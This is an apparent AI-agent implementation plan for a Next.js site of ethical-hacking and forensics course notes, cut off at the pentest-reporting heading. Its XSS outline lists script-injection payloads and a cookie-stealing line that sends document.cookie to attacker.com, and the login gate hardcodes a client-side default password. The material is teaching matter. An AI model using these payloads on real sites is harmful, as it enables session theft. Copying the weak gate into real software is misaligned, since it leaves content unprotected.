# EHAC Notes Site Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Build a clean, searchable, password-protected docs-style Next.js site at notes.comr.ie containing comprehensive EHAC course notes derived from the master lecture slides PDF.

**Architecture:** Separate Next.js 14 (App Router) project at `/home/tom/projects/notes`. All notes are stored as TypeScript data files (not markdown files) so they render as rich React components with code blocks, tables, and callout boxes. A single layout wraps all pages with a sidebar navigator and search bar. Password protection uses a client-side localStorage gate (sufficient since the goal is casual privacy, not security).

**Tech Stack:** Next.js 14 (App Router), TypeScript, Tailwind CSS, Geist font (matches main site). No external dependencies beyond Next.js defaults.

---

## Content Map

The notes cover the following topics extracted from the EHAC master lecture slides:

1. **XSS** — types, payloads, bypass, encoding
2. **Steganography** — techniques, tools, detection
3. **Digital Forensics: Foundations** — ACPO, chain of custody, evidence types, order of volatility
4. **Digital Forensics: File Systems & Timestamps** — NTFS, FAT, MACB, MFT, slack space
5. **Digital Forensics: Deleted Files** — deletion mechanics, file carving, ADS, Recycle Bin
6. **Digital Forensics: Windows Registry** — hives, keys, data types, forensic value, USB forensics, SIDs/GUIDs
7. **Digital Forensics: Windows Event Logs** — log files, event IDs, logon types, clock verification
8. **Digital Forensics: Interpretation & Reporting** — 5WH, attribution, report structure, SOPs
9. **Penetration Testing: Methodology** — PTES phases, scope, rules of engagement, tools
10. **Penetration Testing: Report Writing** — structure, risk ratings, finding format, CVSS
11. **Vulnerabilities Reference** — Heartbleed (CVE-2014-0160), TLS 1.0/1.1, HTTP headers, HSTS

---

## Task 1: Scaffold the Next.js Project

**Files:**
- Create: `package.json`
- Create: `next.config.ts`
- Create: `tsconfig.json`
- Create: `tailwind.config.ts`
- Create: `postcss.config.mjs`
- Create: `.gitignore`

**Step 1: Initialise the project with npm**

```bash
cd /home/tom/projects/notes
npm init -y
npm install next@14 react react-dom
npm install -D typescript @types/node @types/react @types/react-dom tailwindcss postcss autoprefixer
npx tailwindcss init -p
```

**Step 2: Create `package.json` scripts section**

Add to package.json:
```json
{
  "scripts": {
    "dev": "next dev",
    "build": "next build",
    "start": "next start"
  }
}
```

**Step 3: Create `tsconfig.json`**

```json
{
  "compilerOptions": {
    "target": "ES2017",
    "lib": ["dom", "dom.iterable", "esnext"],
    "allowJs": true,
    "skipLibCheck": true,
    "strict": true,
    "noEmit": true,
    "esModuleInterop": true,
    "module": "esnext",
    "moduleResolution": "bundler",
    "resolveJsonModule": true,
    "isolatedModules": true,
    "jsx": "preserve",
    "incremental": true,
    "plugins": [{ "name": "next" }],
    "paths": { "@/*": ["./*"] }
  },
  "include": ["next-env.d.ts", "**/*.ts", "**/*.tsx", ".next/types/**/*.ts"],
  "exclude": ["node_modules"]
}
```

**Step 4: Create `next.config.ts`**

```typescript
import type { NextConfig } from "next";
const nextConfig: NextConfig = {};
export default nextConfig;
```

**Step 5: Create `tailwind.config.ts`**

```typescript
import type { Config } from "tailwindcss";
const config: Config = {
  content: [
    "./app/**/*.{js,ts,jsx,tsx,mdx}",
    "./components/**/*.{js,ts,jsx,tsx,mdx}",
  ],
  theme: {
    extend: {
      fontFamily: {
        sans: ["var(--font-geist-sans)", "system-ui", "sans-serif"],
        mono: ["var(--font-geist-mono)", "ui-monospace", "monospace"],
      },
    },
  },
  plugins: [],
};
export default config;
```

**Step 6: Create `.gitignore`**

```
node_modules/
.next/
.env
.env.local
```

**Step 7: Commit**

```bash
cd /home/tom/projects/notes
git init
git add package.json tsconfig.json next.config.ts tailwind.config.ts postcss.config.mjs .gitignore
git commit -m "feat: scaffold Next.js notes project"
```

---

## Task 2: Global Layout & Styles

**Files:**
- Create: `app/globals.css`
- Create: `app/layout.tsx`

**Step 1: Create `app/globals.css`**

```css
@tailwind base;
@tailwind components;
@tailwind utilities;

:root {
  --sidebar-width: 260px;
}

html {
  scroll-behavior: smooth;
}

/* Code block styling */
pre {
  @apply bg-gray-900 text-gray-100 rounded-lg p-4 overflow-x-auto text-sm font-mono;
}

code:not(pre code) {
  @apply bg-gray-100 text-gray-800 px-1.5 py-0.5 rounded text-sm font-mono;
}
```

**Step 2: Create `app/layout.tsx`**

```typescript
import type { Metadata } from "next";
import { Geist, Geist_Mono } from "next/font/google";
import "./globals.css";

const geistSans = Geist({ variable: "--font-geist-sans", subsets: ["latin"] });
const geistMono = Geist_Mono({ variable: "--font-geist-mono", subsets: ["latin"] });

export const metadata: Metadata = {
  title: "EHAC Notes",
  description: "Course notes for EHAC — University of York",
  metadataBase: new URL("https://notes.comr.ie"),
};

export default function RootLayout({ children }: { children: React.ReactNode }) {
  return (
    <html lang="en">
      <body className={`${geistSans.variable} ${geistMono.variable} font-sans bg-white text-gray-900`}>
        {children}
      </body>
    </html>
  );
}
```

**Step 3: Commit**

```bash
git add app/globals.css app/layout.tsx
git commit -m "feat: add global layout and styles"
```

---

## Task 3: Notes Data Structure

Create a central data module that defines all topics and their sections. This drives both the sidebar navigation and the search index.

**Files:**
- Create: `lib/notes-data.ts`

**Step 1: Define the TypeScript types and data**

```typescript
// lib/notes-data.ts

export type Section = {
  id: string;
  title: string;
  content: string; // plaintext version for search indexing
};

export type Topic = {
  slug: string;
  title: string;
  description: string;
  sections: Section[];
};

export const topics: Topic[] = [
  {
    slug: "xss",
    title: "Cross-Site Scripting (XSS)",
    description: "Types, payloads, bypass techniques, and encoding",
    sections: [
      { id: "what-is-xss", title: "What is XSS?", content: "..." },
      // ... (populated in Task 5)
    ],
  },
  // all other topics listed in Content Map above
];

export function getTopicBySlug(slug: string): Topic | undefined {
  return topics.find(t => t.slug === slug);
}

export function getAllSlugs(): string[] {
  return topics.map(t => t.slug);
}
```

**Step 2: Commit stub**

```bash
git add lib/notes-data.ts
git commit -m "feat: add notes data structure stub"
```

---

## Task 4: Password Protection Component

**Files:**
- Create: `components/PasswordGate.tsx`

The password is stored as an env var `NOTES_PASSWORD` (defaults to a hardcoded value if not set). The client checks localStorage for `notes_auth=true`. If not present, shows a password form.

**Step 1: Create `components/PasswordGate.tsx`**

```typescript
"use client";
import { useState, useEffect } from "react";

const PASSWORD = process.env.NEXT_PUBLIC_NOTES_PASSWORD ?? "ehac2025";

export default function PasswordGate({ children }: { children: React.ReactNode }) {
  const [authed, setAuthed] = useState<boolean | null>(null);
  const [input, setInput] = useState("");
  const [error, setError] = useState(false);

  useEffect(() => {
    setAuthed(localStorage.getItem("notes_auth") === "true");
  }, []);

  if (authed === null) return null; // hydration guard

  if (!authed) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="bg-white rounded-2xl shadow-lg p-10 w-full max-w-sm">
          <h1 className="text-2xl font-bold mb-1">EHAC Notes</h1>
          <p className="text-gray-500 text-sm mb-6">Enter password to continue</p>
          <form onSubmit={e => {
            e.preventDefault();
            if (input === PASSWORD) {
              localStorage.setItem("notes_auth", "true");
              setAuthed(true);
            } else {
              setError(true);
              setInput("");
            }
          }}>
            <input
              type="password"
              value={input}
              onChange={e => { setInput(e.target.value); setError(false); }}
              placeholder="Password"
              className={`w-full border rounded-lg px-4 py-2.5 text-sm mb-3 outline-none focus:ring-2 focus:ring-blue-500 ${error ? "border-red-400" : "border-gray-300"}`}
              autoFocus
            />
            {error && <p className="text-red-500 text-xs mb-3">Incorrect password</p>}
            <button type="submit" className="w-full bg-blue-600 text-white rounded-lg py-2.5 text-sm font-medium hover:bg-blue-700 transition-colors">
              Enter
            </button>
          </form>
        </div>
      </div>
    );
  }

  return <>{children}</>;
}
```

**Step 2: Commit**

```bash
git add components/PasswordGate.tsx
git commit -m "feat: add password gate component"
```

---

## Task 5: Sidebar Navigation Component

**Files:**
- Create: `components/Sidebar.tsx`

**Step 1: Create `components/Sidebar.tsx`**

```typescript
"use client";
import Link from "next/link";
import { usePathname } from "next/navigation";
import { topics } from "@/lib/notes-data";

export default function Sidebar() {
  const pathname = usePathname();

  return (
    <aside className="w-[260px] shrink-0 h-screen sticky top-0 overflow-y-auto border-r border-gray-200 bg-gray-50 flex flex-col">
      <div className="px-5 py-5 border-b border-gray-200">
        <Link href="/" className="block">
          <span className="font-bold text-gray-900 text-base">EHAC Notes</span>
          <span className="block text-xs text-gray-400 mt-0.5">University of York</span>
        </Link>
      </div>

      <nav className="flex-1 px-3 py-4 space-y-0.5">
        {topics.map(topic => (
          <Link
            key={topic.slug}
            href={`/${topic.slug}`}
            className={`block px-3 py-2 rounded-lg text-sm transition-colors ${
              pathname === `/${topic.slug}`
                ? "bg-blue-50 text-blue-700 font-medium"
                : "text-gray-600 hover:bg-gray-100 hover:text-gray-900"
            }`}
          >
            {topic.title}
          </Link>
        ))}
      </nav>

      <div className="px-5 py-4 border-t border-gray-200">
        <a href="https://comr.ie" className="text-xs text-gray-400 hover:text-gray-600">
          ← comr.ie
        </a>
      </div>
    </aside>
  );
}
```

**Step 2: Commit**

```bash
git add components/Sidebar.tsx
git commit -m "feat: add sidebar navigation"
```

---

## Task 6: Search Component

**Files:**
- Create: `components/Search.tsx`

Search is a client component that filters across all topics and sections, displaying matching results in a dropdown overlay.

**Step 1: Create `components/Search.tsx`**

```typescript
"use client";
import { useState, useRef, useEffect } from "react";
import { useRouter } from "next/navigation";
import { topics } from "@/lib/notes-data";

type Result = { topicSlug: string; topicTitle: string; sectionId: string; sectionTitle: string; snippet: string; };

export default function Search() {
  const [query, setQuery] = useState("");
  const [results, setResults] = useState<Result[]>([]);
  const [open, setOpen] = useState(false);
  const ref = useRef<HTMLDivElement>(null);
  const router = useRouter();

  useEffect(() => {
    if (!query.trim()) { setResults([]); return; }
    const q = query.toLowerCase();
    const found: Result[] = [];
    for (const topic of topics) {
      for (const section of topic.sections) {
        if (section.title.toLowerCase().includes(q) || section.content.toLowerCase().includes(q)) {
          const idx = section.content.toLowerCase().indexOf(q);
          const snippet = section.content.slice(Math.max(0, idx - 40), idx + 80);
          found.push({ topicSlug: topic.slug, topicTitle: topic.title, sectionId: section.id, sectionTitle: section.title, snippet });
          if (found.length >= 8) break;
        }
      }
      if (found.length >= 8) break;
    }
    setResults(found);
  }, [query]);

  useEffect(() => {
    function handler(e: MouseEvent) {
      if (ref.current && !ref.current.contains(e.target as Node)) setOpen(false);
    }
    document.addEventListener("mousedown", handler);
    return () => document.removeEventListener("mousedown", handler);
  }, []);

  return (
    <div ref={ref} className="relative w-full max-w-md">
      <input
        type="search"
        placeholder="Search notes..."
        value={query}
        onChange={e => { setQuery(e.target.value); setOpen(true); }}
        onFocus={() => setOpen(true)}
        className="w-full border border-gray-200 rounded-lg px-4 py-2 text-sm bg-white outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
      />
      {open && results.length > 0 && (
        <div className="absolute top-full mt-1 w-full bg-white border border-gray-200 rounded-xl shadow-xl z-50 overflow-hidden">
          {results.map((r, i) => (
            <button
              key={i}
              onClick={() => { router.push(`/${r.topicSlug}#${r.sectionId}`); setOpen(false); setQuery(""); }}
              className="w-full text-left px-4 py-3 hover:bg-gray-50 border-b border-gray-100 last:border-0"
            >
              <div className="text-xs text-blue-600 font-medium mb-0.5">{r.topicTitle} → {r.sectionTitle}</div>
              <div className="text-xs text-gray-500 truncate">...{r.snippet}...</div>
            </button>
          ))}
        </div>
      )}
    </div>
  );
}
```

**Step 2: Commit**

```bash
git add components/Search.tsx
git commit -m "feat: add full-text search component"
```

---

## Task 7: Main App Layout (with sidebar + search)

**Files:**
- Create: `components/DocsLayout.tsx`
- Create: `components/ContentComponents.tsx`

**Step 1: Create `components/ContentComponents.tsx`** — Reusable primitives for notes pages

```typescript
// Callout box (for warnings, key points, exam tips)
export function Callout({ type = "info", children }: { type?: "info" | "warning" | "tip" | "danger"; children: React.ReactNode }) {
  const styles = {
    info: "bg-blue-50 border-blue-300 text-blue-900",
    warning: "bg-yellow-50 border-yellow-300 text-yellow-900",
    tip: "bg-green-50 border-green-300 text-green-900",
    danger: "bg-red-50 border-red-300 text-red-900",
  };
  const icons = { info: "ℹ", warning: "⚠", tip: "💡", danger: "🚨" };
  return (
    <div className={`border-l-4 rounded-r-lg p-4 my-4 ${styles[type]}`}>
      <span className="font-bold mr-2">{icons[type]}</span>{children}
    </div>
  );
}

// Inline code / key term highlight
export function Term({ children }: { children: React.ReactNode }) {
  return <code className="bg-gray-100 text-gray-800 px-1.5 py-0.5 rounded text-sm font-mono">{children}</code>;
}

// Quick reference table
export function Table({ headers, rows }: { headers: string[]; rows: string[][] }) {
  return (
    <div className="overflow-x-auto my-4">
      <table className="min-w-full text-sm border-collapse border border-gray-200 rounded-lg overflow-hidden">
        <thead>
          <tr className="bg-gray-100">
            {headers.map(h => <th key={h} className="border border-gray-200 px-4 py-2.5 text-left font-semibold text-gray-700">{h}</th>)}
          </tr>
        </thead>
        <tbody>
          {rows.map((row, i) => (
            <tr key={i} className={i % 2 === 0 ? "bg-white" : "bg-gray-50"}>
              {row.map((cell, j) => <td key={j} className="border border-gray-200 px-4 py-2 text-gray-700">{cell}</td>)}
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}
```

**Step 2: Create `components/DocsLayout.tsx`**

```typescript
import Sidebar from "./Sidebar";
import Search from "./Search";

export default function DocsLayout({ children }: { children: React.ReactNode }) {
  return (
    <div className="flex min-h-screen">
      <Sidebar />
      <div className="flex-1 min-w-0">
        <header className="sticky top-0 z-10 bg-white/80 backdrop-blur border-b border-gray-200 px-8 py-3 flex items-center gap-4">
          <Search />
        </header>
        <main className="px-8 py-8 max-w-4xl">
          {children}
        </main>
      </div>
    </div>
  );
}
```

**Step 3: Commit**

```bash
git add components/DocsLayout.tsx components/ContentComponents.tsx
git commit -m "feat: add docs layout and content components"
```

---

## Task 8: Home Page

**Files:**
- Create: `app/page.tsx`

**Step 1: Create `app/page.tsx`**

```typescript
import PasswordGate from "@/components/PasswordGate";
import DocsLayout from "@/components/DocsLayout";
import Link from "next/link";
import { topics } from "@/lib/notes-data";

export default function Home() {
  return (
    <PasswordGate>
      <DocsLayout>
        <h1 className="text-3xl font-bold mb-2">EHAC Course Notes</h1>
        <p className="text-gray-500 mb-8">University of York — 2025/26</p>
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          {topics.map(topic => (
            <Link key={topic.slug} href={`/${topic.slug}`}
              className="block p-5 border border-gray-200 rounded-xl hover:border-blue-300 hover:shadow-sm transition-all">
              <h2 className="font-semibold text-gray-900 mb-1">{topic.title}</h2>
              <p className="text-sm text-gray-500">{topic.description}</p>
            </Link>
          ))}
        </div>
      </DocsLayout>
    </PasswordGate>
  );
}
```

**Step 2: Commit**

```bash
git add app/page.tsx
git commit -m "feat: add home page with topic index"
```

---

## Task 9: Dynamic Topic Pages

**Files:**
- Create: `app/[slug]/page.tsx`
- Create: `app/[slug]/TopicContent.tsx`

**Step 1: Create `app/[slug]/page.tsx`**

```typescript
import { notFound } from "next/navigation";
import PasswordGate from "@/components/PasswordGate";
import DocsLayout from "@/components/DocsLayout";
import { getTopicBySlug, getAllSlugs } from "@/lib/notes-data";
import TopicContent from "./TopicContent";

export function generateStaticParams() {
  return getAllSlugs().map(slug => ({ slug }));
}

export default function TopicPage({ params }: { params: { slug: string } }) {
  const topic = getTopicBySlug(params.slug);
  if (!topic) notFound();
  return (
    <PasswordGate>
      <DocsLayout>
        <TopicContent topic={topic} />
      </DocsLayout>
    </PasswordGate>
  );
}
```

**Step 2: Create `app/[slug]/TopicContent.tsx`** — renders the full notes for a topic

Each topic's content is a React component defined in `lib/topics/*.tsx`. This file imports the correct one by slug.

```typescript
import type { Topic } from "@/lib/notes-data";

// Import content components for each topic
import XssContent from "@/lib/topics/xss";
import StegContent from "@/lib/topics/steganography";
import ForensicsFoundationsContent from "@/lib/topics/forensics-foundations";
import ForensicsFileSystemsContent from "@/lib/topics/forensics-filesystems";
import ForensicsDeletedContent from "@/lib/topics/forensics-deleted";
import RegistryContent from "@/lib/topics/registry";
import EventLogsContent from "@/lib/topics/event-logs";
import ForensicsReportingContent from "@/lib/topics/forensics-reporting";
import PentestMethodContent from "@/lib/topics/pentest-methodology";
import PentestReportContent from "@/lib/topics/pentest-reporting";
import VulnRefContent from "@/lib/topics/vuln-reference";

const contentMap: Record<string, React.FC> = {
  "xss": XssContent,
  "steganography": StegContent,
  "forensics-foundations": ForensicsFoundationsContent,
  "forensics-filesystems": ForensicsFileSystemsContent,
  "forensics-deleted": ForensicsDeletedContent,
  "registry": RegistryContent,
  "event-logs": EventLogsContent,
  "forensics-reporting": ForensicsReportingContent,
  "pentest-methodology": PentestMethodContent,
  "pentest-reporting": PentestReportContent,
  "vuln-reference": VulnRefContent,
};

export default function TopicContent({ topic }: { topic: Topic }) {
  const Content = contentMap[topic.slug];
  if (!Content) return <p>Content coming soon.</p>;
  return (
    <article className="prose prose-gray max-w-none">
      <h1>{topic.title}</h1>
      <Content />
    </article>
  );
}
```

**Step 3: Commit skeleton**

```bash
git add app/[slug]/page.tsx app/[slug]/TopicContent.tsx
git commit -m "feat: add dynamic topic page routing"
```

---

## Task 10: Write All Notes Content

This is the largest task. Create all 11 topic content files in `lib/topics/`. Each file exports a React component with full in-depth notes. Use `Callout`, `Table`, and `Term` from ContentComponents.

**Files to create:**
- `lib/topics/xss.tsx`
- `lib/topics/steganography.tsx`
- `lib/topics/forensics-foundations.tsx`
- `lib/topics/forensics-filesystems.tsx`
- `lib/topics/forensics-deleted.tsx`
- `lib/topics/registry.tsx`
- `lib/topics/event-logs.tsx`
- `lib/topics/forensics-reporting.tsx`
- `lib/topics/pentest-methodology.tsx`
- `lib/topics/pentest-reporting.tsx`
- `lib/topics/vuln-reference.tsx`

### Content: `lib/topics/xss.tsx`

Key topics to cover:
- Definition: injecting malicious scripts into web pages viewed by other users
- Three types: Reflected (non-persistent, in URL), Stored (persistent, in DB), DOM-based (client-side)
- Basic payload: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`
- Cookie theft: `document.cookie`, `new Image().src = "attacker.com/?c=" + document.cookie`
- Encoding bypass techniques: HTML entities, URL encoding, Unicode, case variation
- Context-aware injection: HTML context, attribute context, JavaScript context, URL context
- CSP as a mitigation
- HttpOnly cookie flag
- Output encoding vs input validation

### Content: `lib/topics/steganography.tsx`

Key topics to cover:
- Definition: hiding data within other data (carrier file)
- Types: spatial domain (LSB), frequency domain (DCT), text-based
- Image steganography: LSB (Least Significant Bit) substitution — changes pixel values minimally
- Audio steganography: LSB in audio samples, echo hiding
- Tools: steghide (hide/extract with passphrase), binwalk (firmware analysis / find embedded files), exiftool (metadata), strings
- Detection (steganalysis): chi-squared analysis, histogram analysis, visual inspection
- Common file formats used: PNG, BMP, JPG, WAV, MP3
- Zone.Identifier ADS as a related concept
- Exam tip: if a file behaves oddly, run `binwalk` and `steghide extract`

### Content: `lib/topics/forensics-foundations.tsx`

Key topics to cover (from Part I slides):
- ACPO (Association of Chief Police Officers) Principles:
  1. No action should change data on digital devices
  2. A person accessing original data must be competent and able to justify their actions
  3. An audit trail must be created and preserved (reproducibility)
  4. The person in charge of the investigation is responsible for compliance
- Types of digital evidence: volatile (RAM, network connections, running processes) vs non-volatile (disk, files)
- Order of volatility (most volatile first): CPU cache/registers → RAM → Swap/paging file → Network state → Running processes → Disk → Removable media → Backups
- Chain of custody: documentation tracking who handled evidence, when, where
- Write blockers: hardware/software tools preventing writes to evidence media
- Hash verification: MD5/SHA-256 before and after acquisition to prove integrity
- Forensic imaging: bit-for-bit copy (dd, FTK Imager, Autopsy)
- Live vs dead forensics
- Locard's exchange principle: every contact leaves a trace

### Content: `lib/topics/forensics-filesystems.tsx`

Key topics to cover (from Part II slides):
- NTFS (New Technology File System):
  - MFT (Master File Table): one record per file/directory, 1KB per record
  - MFT entry contains: file metadata, timestamps, attributes, resident data (< ~700 bytes)
  - $MFT, $MFTMirr, $LogFile, $Bitmap system files
  - Hard links, symbolic links
  - Timestamps stored in UTC
- FAT (File Allocation Table) / FAT32:
  - Uses a linked-list allocation table
  - Timestamps stored in local time
  - No journalling → less reliable timestamps
- MACB Timestamps (NTFS):
  - M = Modified (content last changed)
  - A = Accessed (last read)
  - C = Changed ($MFT record last changed — metadata, not content)
  - B = Born (file creation time — $STANDARD_INFO and $FILE_NAME)
  - Two sets: $STANDARD_INFORMATION and $FILE_NAME attribute
  - Timestomping: modifying timestamps to mislead investigators
  - Key insight: $FILE_NAME timestamps cannot be modified by standard user tools, only $STANDARD_INFORMATION can be stomped
- Slack space: unused space at end of a cluster — can contain remnant data
- NTFS = UTC; FAT = local time — always verify timezone from Registry

### Content: `lib/topics/forensics-deleted.tsx`

Key topics to cover (from Part III slides):
- How deletion works: sets MFT record flag to "not in use", frees clusters in $Bitmap — data remains until overwritten
- MFT records survive until the record is reused for a new file
- Unallocated space: clusters freed but not yet overwritten — recoverable
- File carving: scanning raw disk for file headers/footers (magic bytes) regardless of filesystem
  - Common magic bytes: JPEG (FF D8 FF), PNG (89 50 4E 47), PDF (%PDF), ZIP (50 4B 03 04)
  - Tools: photorec, foremost, scalpel
- ADS (Alternate Data Streams): NTFS feature allowing multiple data streams per file
  - Syntax: `file.txt:hiddenstream`
  - Used by malware to hide payloads, also used legitimately by Windows
  - Zone.Identifier: ADS added when downloading files from internet, marks the "zone" origin
  - View with `dir /r` or `Get-Item file.txt -Stream *`
- Recycle Bin forensics:
  - $R[random] file: contains the actual deleted file content
  - $I[random] file: contains metadata (original path, deletion time, file size, user SID)
  - Located in `C:\$Recycle.Bin\[SID]\`
  - SID in path identifies which user deleted the file
- Volume Shadow Copies (VSS): Windows snapshot feature, may preserve older file versions

### Content: `lib/topics/registry.tsx`

Key topics to cover (from Part IV slides, Registry section):
- Definition: centralised hierarchical database for Windows OS, software, hardware, user configuration
- Structure: keys, sub-keys, values (name + type + data)
- Five root keys:
  - HKEY_LOCAL_MACHINE (HKLM) — machine-wide settings
  - HKEY_CURRENT_USER (HKCU) — current logged-in user settings
  - HKEY_USERS (HKU) — all user profiles
  - HKEY_CLASSES_ROOT (HKCR) — file associations and COM objects
  - HKEY_CURRENT_CONFIG (HKCC) — current hardware profile
- Registry data types:
  - REG_SZ — plain text string
  - REG_EXPAND_SZ — string with variables (e.g., %USERPROFILE%)
  - REG_MULTI_SZ — list of strings
  - REG_DWORD — 32-bit integer
  - REG_BINARY — raw binary data
- Registry hives (files on disk): `C:\Windows\System32\Config\`
  - SAM — user accounts and hashed passwords
  - SECURITY — local security policy
  - SYSTEM — startup, OS behaviour, device info
  - SOFTWARE — installed software and file associations
  - User hive: `%USERPROFILE%\NTUSER.DAT` — recently opened files, typed URLs, search history, app-specific settings
- Timestamps: each key has a "Last Write" timestamp (UTC FILETIME format). Per-key only, NOT per-value — you know something changed, not what.
- Linux has no registry; config distributed: /etc (system), ~/.config (user), app-specific. macOS uses .plist files in ~/Library/Preferences
- Forensic value: USB devices, user accounts/SIDs, time zone, autostart (persistence), installed software, typed URLs, network connections, recently opened files
- GUIDs: 128-bit identifiers for software components, device classes, known folders. Format: {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
- SIDs (Security Identifiers): uniquely identify user accounts. Format: S-1-5-21-[domain]-[RID]. RID 500 = built-in Admin, 501 = Guest, 1000+ = normal users
- USB Device Forensics (4 steps):
  1. Find VID/PID — SYSTEM\ControlSet001\Enum\USB (VID = Vendor ID, PID = Product ID, both 16-bit hex)
  2. Look up manufacturer — use USB ID Repository (linux-usb.org)
  3. Serial number — appears in key path. Warning: if 2nd character is '&', Windows generated it (device has no true serial; multiple identical devices may share)
  4. Last insertion timestamp — SYSTEM\ControlSet001\Control\DeviceClasses\{53f56307-b6bf-11d0-94f2-00a0c91efb8b} — Last Write time updated when device physically inserted. Caveat: NOT always reliable on modern Windows — enumerator may update independently. Corroborate with Event Logs and setupapi.dev.log
- Full USB picture: SYSTEM:Enum\USB (VID/PID/serial) + SYSTEM:Enum\USBSTOR (friendly name) + SYSTEM:DeviceClasses (timestamp) + Event Logs/setupapi.dev.log (first install time)

### Content: `lib/topics/event-logs.tsx`

Key topics to cover (from Part IV slides, Event Logs section):
- Windows maintains a framework for recording and auditing system events
- Events include: logon/logoff, account creation, time sync, application errors, service start/stop, file access (if auditing enabled), USB insertion
- Limitations: default 7-day retention on domain machines; standalone = size-limited; not all auditing enabled by default; absent evidence ≠ evidence of absence
- Linux equivalents: /var/log/auth.log (authentication), /var/log/syslog (general). Use journalctl. Linux SYSLOG has historically been more mature.
- Log file location: `C:\Windows\System32\winevt\Logs\`
- Key log files:
  - Security.evtx — logon/logoff, privilege use, object access
  - System.evtx — OS events, time synchronisation
  - Application.evtx — application-generated events
  - Setup.evtx — system setup events
- Channels: serviced (contain admin/operational events, can be forwarded to SIEM, e.g. Security.evtx) vs direct (local only, analytic/debug events)
- Each event includes: source, level (Information/Warning/Error/Critical), user/impersonation ID, timestamp (UTC), Event ID, correlation ID
- Binary format: .evtx files are binary tokenised XML. Use Event Viewer, python-evtx, or forensic tools. Never `cat` an .evtx file.
- Logon events:
  - Local logon: user submits credentials → SAM authenticates → Event 4776 → session created → Event 4624
  - Domain logon: DC authenticates via Kerberos → Event 4768 on DC → Event 4624 on workstation
  - Events appear on two different machines for domain logons
  - Event 4624 = successful logon (contains logon type code)
  - Event 4647 = user-initiated logoff
  - Event 4634 = session closed by system
  - Event 4648 = logon with alternate credentials (e.g., Run As Admin)
- Logon types (in Event 4624):
  - Type 2 = Interactive (physical keyboard)
  - Type 3 = Network (remote share/service access — very common in corporate, not inherently suspicious)
  - Type 4 = Batch (scheduled task)
  - Type 5 = Service (Windows service starting)
  - Type 7 = Unlock (password-protected screen saver dismissed)
  - Type 8 = NetworkCleartext (network logon with UNENCRYPTED credentials)
  - Type 10 = RemoteInteractive (RDP/remote assistance)
  - Type 11 = CachedInteractive (domain logon with cached credentials, machine offline)
  - Note: Type 3 occurs dozens of times/hour in corporate networks (workstation accesses file server, Group Policy refresh every 90 min) — not inherently suspicious
- Session events:
  - 4608 = system startup
  - 4609 = system shutdown
  - 4778 = session reconnected
  - 4779 = session disconnected
  - 4800 = workstation locked
  - 4801 = workstation unlocked
  - 4802 = screen saver started
  - 4803 = screen saver dismissed
- Subtle behaviours: screen saver ≠ locked workstation (locked only after saver dismissed + password prompt). Cannot distinguish automatic from manual locking via events alone. Event pairing (logon/logoff) requires care on busy domain machines.
- Clock verification events (System.evtx):
  - Event 35 = Network time service invoked (NTP sync active)
  - Event 37 = Time updated via NTP (clock was corrected)
  - Event 4616 = System time manually changed (possible clock manipulation)
  - Note: Event 4616 with large time jump doesn't necessarily indicate tampering — could be VM snapshot restore, time zone change, etc.
- Retention settings: SYSTEM\ControlSet001\Services\Eventlog\Security, values MaxSize and Retention. Default standalone: overwrite oldest when full. Domain-joined: 7 days by default (group policy). Examine logs promptly or they may be overwritten.
- SIEM: in managed environments, logs forwarded to central SIEM in near real-time — local copy may be overwritten but SIEM retains it.

### Content: `lib/topics/forensics-reporting.tsx`

Key topics to cover (from Part IV slides, Interpretation/Reporting section):
- Analysis vs Interpretation: analysis tells you WHAT is on the system; interpretation tells you WHAT IT MEANS
- 5WH framework: What happened (event), Where (machine/account/directory), When (reconstructed timeline), How (mechanism: USB/remote login/email), Why (motive — often requires non-technical evidence), Who (the account — not necessarily the person)
- Attribution problem: digital evidence shows which ACCOUNT performed an action, not which PERSON. "Someone else used my password" is a legitimate defence. Corroborate with physical access records, CCTV, mobile data, witness statements.
- Golden rule: "Assume nothing. Believe nothing. Challenge everything. Follow the evidence. Do not seek to prove a hypothesis."
- Report structure (lab/expert witness):
  1. Receipt of Items
  2. Background and Circumstances
  3. Purpose of Examination
  4. Technical Issues
  5. Examination and Results (structured logically by individual/scene/evidence type; items ordered by evidential weight)
  6. Interpretation of Findings
  7. Conclusion(s)
  - Other inclusions: use of assistants, disclosure obligations, evidence submitted but not examined, references to scene photographs/other scientists' statements
  - Plain language requirement: report read by judge, jury, opposing counsel — none may have technical background. Must be explainable in plain language.
- Planning: incident-based planning (response plan for each predicted incident type — risk: confirmation bias) vs source-based planning (work through every potential evidence source — more systematic, more labour-intensive)
- SOPs (Standard Operating Procedures): simple, step-by-step, non-branching procedures for specific tasks. Like recipes: kitchen can't predict orders but has a recipe for every dish. ISO/IEC 27042 and SWGDE publish example SOPs.

### Content: `lib/topics/pentest-methodology.tsx`

Key topics to cover:
- Definition: authorised, simulated attack on a system to discover vulnerabilities before real attackers do
- PTES (Penetration Testing Execution Standard) phases:
  1. Planning/Reconnaissance: define scope, rules of engagement, OSINT gathering (Shodan, Censys, theHarvester, crt.sh, Wayback Machine)
  2. Scanning & Enumeration: active scanning (Nmap for port scanning/service fingerprinting, Nikto for web misconfig, testssl.sh for TLS, OpenVAS for vuln scanning)
  3. Exploitation: confirm vulnerabilities, demonstrate real-world impact, manual exploitation
  4. Post-Exploitation/Escalation: lateral movement, data exposure assessment — limited to agreed scope
  5. Reporting: consolidate findings, CVSS risk rating, full technical detail with reproduction steps and remediation guidance
- Key standards: PTES, OWASP Testing Guide v4.2, NIST SP 800-115
- Scope definition: in-scope vs out-of-scope assets, rules of engagement, exclusions (DoS, physical, social engineering)
- Black-box vs white-box vs grey-box testing
- OSINT tools: Shodan/Censys (banner grabbing, TLS certs), theHarvester (email/subdomain enum), crt.sh (Certificate Transparency), Wayback Machine (historical content)
- Active scanning tools: Nmap (nmap -sV -p 443 --script ssl-heartbleed), Nikto, testssl.sh, OpenVAS
- Exploitation tools: Metasploit Framework, Burp Suite Pro, custom Python PoCs
- Responsible disclosure: notify immediately upon critical finding; provide interim mitigations; document all actions with timestamps

### Content: `lib/topics/pentest-reporting.tsx`

Key topics to cover (from PizzaPineapple case study):
